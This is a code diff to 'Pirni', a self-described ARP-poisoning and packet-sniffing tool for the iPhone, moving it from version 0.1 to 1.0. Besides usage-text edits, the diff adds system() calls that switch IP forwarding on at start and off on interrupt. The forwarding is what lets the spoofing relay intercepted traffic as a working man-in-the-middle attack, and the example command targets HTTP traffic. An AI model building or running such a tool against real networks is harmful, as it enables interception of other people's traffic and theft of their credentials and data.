@@ -1,13 +1,13 @@
-/* Pirni ARP poisoning and packet sniffing v0.1 -- n1mda, for the iPhone
-	compile with gcc pirni.c -o pirni -lpcap -lnet -pthread */
+/* Pirni ARP poisoning and packet sniffing v1.0 -- n1mda, for the iPhone
+	compile with (arm-apple-darwin9-)gcc pirni.c -o pirni -lpcap -lnet -pthread */
 	
 #include "pirni.h"
 
 void print_usage(char *name)
 {
-	printf("Pirni ARP Spoofer and packet sniffer v0.1\n\n");
-	printf("Usage:\t%s -i interface -s source_ip -b broadcast_ip -f [BPF_Filer]\n", name);
-	printf("Ex:\t%s -i en0 -s 192.168.0.1 -b 255.255.255.255 -f 'tcp dst port 80'\n", name);
+	printf("Pirni ARP Spoofer and packet sniffer v1.0\n\n");
+	printf("Usage:\t%s -i interface -s source_ip -b broadcast_ip -f [BPF_Filter]\n", name);
+	printf("Ex:\t%s -i en0 -s 192.168.0.1 -b 255.255.255.255 -f \"tcp dst port 80\"\n", name);
 	
 	return;
 }
@@ -21,7 +21,6 @@ int main(int argc, char *argv[])
 	char			errbuf[LIBNET_ERRBUF_SIZE];
 	char			*BPFfilter;
 	static u_char	SrcHW[ETH_ALEN];
-	//static u_char	DstHW[ETH_ALEN]					= {0x00, 0x23, 0x12, 0xc1, 0xec, 0xae};
 	static u_char	DstHW[ETH_ALEN]					= {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 	int c;
 
@@ -73,6 +72,11 @@ int main(int argc, char *argv[])
 	if(BPFfilter == NULL) {
 		BPFfilter = "";
 	}
+	
+	printf("[+] Initializing packet forwarding: sysctl -w net.inet.ip.forwarding=1\n");
+	system("sysctl -w net.inet.ip.forwarding=1");
+	
+	signal(SIGINT, sigint_handler);
 	
 	printf("[+] Initializing libnet on %s\n", device);
 	l = libnet_init(LIBNET_LINK, device, errbuf);
@@ -143,4 +147,12 @@ int main(int argc, char *argv[])
 	
 	libnet_destroy(l);
 	return 0;
+}
+
+void sigint_handler(int sig)
+{
+	printf("[*] Removing packet forwarding: sysctl -w net.inet.ip.forwarding=0\n");
+	system("sysctl -w net.inet.ip.forwarding=0");
+	
+	exit(0);
 }
